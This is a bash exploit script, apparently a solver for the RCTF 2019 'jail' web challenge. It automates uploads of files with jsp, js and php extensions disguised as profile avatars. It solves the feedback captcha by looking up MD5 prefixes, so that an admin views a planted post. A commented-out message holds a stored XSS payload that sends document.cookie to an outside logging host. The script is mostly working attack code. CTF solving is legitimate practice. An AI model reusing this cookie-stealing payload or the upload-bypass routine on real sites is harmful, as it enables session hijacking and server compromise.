#!/usr/bin/env bash

# Author : Virink <virink@outlook.com>
# Date   : 2019/05/19, 01:39

cookie="5033022dd3e932d511b39bd3085c461f"

function runmd5 () {
    local code=$1
    local start=$2
    local end=$3
    res=$(grep -E "(\d+):$code" /Users/virink/Workspace/vFuckingTools/dict/md5.dict)
    echo $res | head -n 1 | awk -F ':' '{print $1}'
}

# Upload Profile
function uploadjsp(){
    curl -q -s https://jail.2019.rctf.rois.io/\?action=profile --cookie "PHPSESSID=$cookie" \
    -x http://127.0.0.1:1086 \
    -F avatar=@ctf.jsp -F test=1 --output - > tmp
    res=$(cat tmp | grep -E "[0-9a-f]{32}\.jsp" -o)
    echo $res
    rm tmp
}

function uploadjs(){
    curl -q -s https://jail.2019.rctf.rois.io/\?action=profile --cookie "PHPSESSID=$cookie" \
    -x http://127.0.0.1:1086 \
    -F avatar=@ctf.js -F test=1 --output - > tmp
    res=$(cat tmp | grep -E "[0-9a-f]{32}\.js" -o)
    echo $res
    rm tmp
}
# cp ctf.html ctf.jsp
# uploadjsp

# view-source:https://jail.2019.rctf.rois.io/uploads/fab938c2ae8ed2b0ea6fb1570c7b9b1b.jsp
# view-source:https://jail.2019.rctf.rois.io/uploads/e358f08eb3642e29007dfdb1763169e6.gif
# view-source:https://jail.2019.rctf.rois.io/uploads/dc57deab35052ed6b449a83e00d81718.js
# view-source:https://jail.2019.rctf.rois.io/uploads/f97a4d7997e6a264b81cb3a5dd70425c.jpg
# 
# view-source:https://jail.2019.rctf.rois.io/uploads/7bcea2f2e5e7efad57ccef6d63d740f9.jsp
# view-source:https://jail.2019.rctf.rois.io/uploads/ca44f0f958f457102e063b00895e22d3.jsp
# 

# Push message
function message(){
    local msg=$1
    echo "message -> '$msg'"
    curl -q -s https://jail.2019.rctf.rois.io/ --cookie "PHPSESSID=$cookie" \
    -x http://127.0.0.1:1086 \
    -F "message=$msg" --output - > tmp
    # cat tmp
    cat tmp | grep -E "id=[0-9a-f]{32}" -o | head -n 1 | awk -F '=' '{print $2}' > _this_post_id
    # cat tmp
    rm tmp
    echo "this post id -> $(cat _this_post_id)"
}

# Feedback
function feedback(){
    curl -q -s https://jail.2019.rctf.rois.io/\?action=feedback \
    -x http://127.0.0.1:1086 \
    --cookie "PHPSESSID=$cookie" --output - > tmp
     # > _captcha_code
    captcha=$(cat tmp | grep substr | grep -E "[0-9a-f]{6}" -o)
    echo "feedback -> captcha = $captcha"
    code=$(runmd5 $captcha)
    id=$(cat _this_post_id)
    echo "feedback -> code = $code + id = $id"
    rm tmp
    curl -q -s https://jail.2019.rctf.rois.io/\?action=feedback --cookie "PHPSESSID=$cookie" \
    -x http://127.0.0.1:1086 \
    -F "id=$id" -F "captcha=$code" --output - | grep message
    # cat tmp
}

# Feedback2
function feedback2(){
    # get id
    curl -q -s https://jail.2019.rctf.rois.io/ --cookie "PHPSESSID=$cookie" \
    -x http://127.0.0.1:1086 --output - > tmp
    cat tmp | grep -E "id=[0-9a-f]{32}" -o | head -n 1 | awk -F '=' '{print $2}' > _this_post_id
    echo "this post id -> $(cat _this_post_id)"
    # feedbaack
    curl -q -s https://jail.2019.rctf.rois.io/\?action=feedback \
    -x http://127.0.0.1:1086 \
    --cookie "PHPSESSID=$cookie" --output - > tmp
     # > _captcha_code
    captcha=$(cat tmp | grep substr | grep -E "[0-9a-f]{6}" -o)
    echo "feedback -> captcha = $captcha"
    code=$(runmd5 $captcha)
    id=$(cat _this_post_id)
    echo "feedback -> code = $code + id = $id"
    rm tmp
    curl -q -s https://jail.2019.rctf.rois.io/\?action=feedback --cookie "PHPSESSID=$cookie" \
    -x http://127.0.0.1:1086 \
    -F "id=$id" -F "captcha=$code" --output - | grep message
    # cat tmp
}

# message " <script>location.assign(\"https://log.virzz.com/a?js=\" + escape(document.cookie));location.assign(\"https://log.virzz.com/a?js=\" + escape(document.cookie));location.assign(\"https://log.virzz.com/a?js=\" + escape(document.cookie));</script>"
feedback2
# uploadjs

# Upload Profile
function uploadphp(){
    local ext=$1
    cp ctf.php "ctf.$ext"
    curl -q -s https://jail.2019.rctf.rois.io/\?action=profile --cookie "PHPSESSID=$cookie" \
    -x http://127.0.0.1:1086 \
    -F avatar=@"ctf.$ext" -F test=1 --output - > tmp
    res=$(cat tmp | grep -E "[0-9a-f]{32}\..*" -o)
    echo $res
    rm tmp "ctf.$ext"
}

# uploadphp a

